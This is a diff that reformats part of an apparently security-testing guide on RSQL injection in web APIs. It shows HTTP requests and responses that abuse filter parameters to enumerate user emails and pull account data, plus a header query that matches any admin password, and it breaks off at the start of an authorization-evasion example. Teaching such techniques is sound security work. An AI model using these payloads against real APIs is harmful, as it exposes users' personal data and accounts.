@@ -148,10 +148,13 @@ Some APIs allow queries to be sent in HTTP headers.
 <HEADER>: username==admin;password==*
 ```
 
-## Information leakage and enumeration of users
-The following request shows a registration endpoint that requires the email parameter to check if there is any user registered with that email and return a true or false depending on whether or not it exists in the database:
+## Information Leakage and Enumeration of Users
+
+The following request shows a registration endpoint that requires the email parameter to check if there is any user registered with that email and returns a true or false depending on whether or not it exists in the database:
+
 ### Request
-```
+
+```http
 GET /api/registrations HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -166,8 +169,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 400 
 Date: Sat, 22 Mar 2025 14:47:14 GMT
 Content-Type: application/vnd.api+json
@@ -188,8 +193,10 @@ Content-Length: 85
 ```
 
 Although a `/api/registrations?email=<emailAccount>` is expected, it is possible to use RSQL filters to attempt to enumerate and/or extract user information through the use of special operators:
+
 ### Request
-```
+
+```http
 GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -204,8 +211,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 14:09:38 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -224,9 +233,12 @@ Access-Control-Allow-Origin: *
     }
 }
 ```
+
 In the case of matching a valid email account, the application would return the user's information instead of a classic *“true”*, *"1"* or whatever in the response to the server:
+
 ### Request
-```
+
+```http
 GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -241,8 +253,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 14:19:46 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -271,9 +285,12 @@ Access-Control-Allow-Origin: *
 }
 ```
 ## Authorization evasion
+
 In this scenario, we start from a user with a basic role and in which we do not have privileged permissions (e.g. administrator) to access the list of all users registered in the database:
+
 ### Request
-```
+
+```http
 GET /api/users HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
